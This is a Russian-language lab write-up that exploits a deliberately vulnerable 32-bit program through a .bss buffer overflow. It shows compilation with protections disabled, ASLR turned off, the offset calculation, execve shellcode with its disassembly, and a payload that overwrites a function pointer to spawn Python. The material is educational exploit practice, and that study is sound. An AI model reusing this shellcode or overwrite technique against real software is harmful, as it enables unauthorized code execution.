
Компилируем уязвимую программу (32-bit, без защиты стека, с исполняемым BSS):

```bash
gcc -g -m32 -fno-stack-protector -z execstack vuln_bss.c -o vuln_bss
```

Запускаем, чтобы увидеть адреса buf, &f и переменной окружения SHELLCODE:

```bash
setarch $(uname -m) -R bash -c '
SC=$(python3 -c "import sys; sys.stdout.buffer.write(b\"\x31\xc0\x50\x68\x68\x6f\x6e\x33\x68\x2f\x70\x79\x74\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\")")
SHELLCODE="$SC" ./vuln_bss a
'
```

```
addr buf: 0x56559040
addr &f: 0x565590a4
1�Phhon3h/pyth/binh/usr��PS��1Ұ
                               ̀ 0xffffc5c9
f: 0x565561cd
v: a
here
```

`0x565590a4 - 0x56559040 = 0x64 = 100` байт -- расстояние от `buf` до указателя `f` в .bss

`0xffffc5c9` -- адрес шеллкода в переменной окружения SHELLCODE

Шеллкод `execve("/usr/bin/python3", NULL, NULL)` (32-bit):

```bash
python3 -c 'print(" ".join(["{:02x}".format(b) for b in b"/usr/bin/python3"]))'
2f 75 73 72 2f 62 69 6e 2f 70 79 74 68 6f 6e 33
```

Создал `pycode.asm`:

```bash
nasm -f elf32 pycode.asm -o pycode.o
objdump -M intel -d pycode.o
```

```
00000000 <_start>:
   0:   31 c0                   xor    eax,eax
   2:   50                      push   eax
   3:   68 68 6f 6e 33          push   0x336e6f68
   8:   68 2f 70 79 74          push   0x7479702f
   d:   68 2f 62 69 6e          push   0x6e69622f
  12:   68 2f 75 73 72          push   0x7273752f
  17:   89 e3                   mov    ebx,esp
  19:   89 c1                   mov    ecx,eax
  1b:   89 c2                   mov    edx,eax
  1d:   b0 0b                   mov    al,0xb
  1f:   cd 80                   int    0x80
```

Пейлоад: 100 байт заполнения + адрес SHELLCODE в формате little-endian.

Что получилось:

```bash
setarch $(uname -m) -R bash -c '
SC=$(python3 -c "import sys; sys.stdout.buffer.write(b\"\x31\xc0\x50\x68\x68\x6f\x6e\x33\x68\x2f\x70\x79\x74\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\")")
SHELLCODE="$SC" ./vuln_bss "$(python3 payload.py)"
'
```

Получаем питонячий >>>
```
Python 3.12.3 (main, Jan 22 2026, 20:57:42) [GCC 13.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 
```
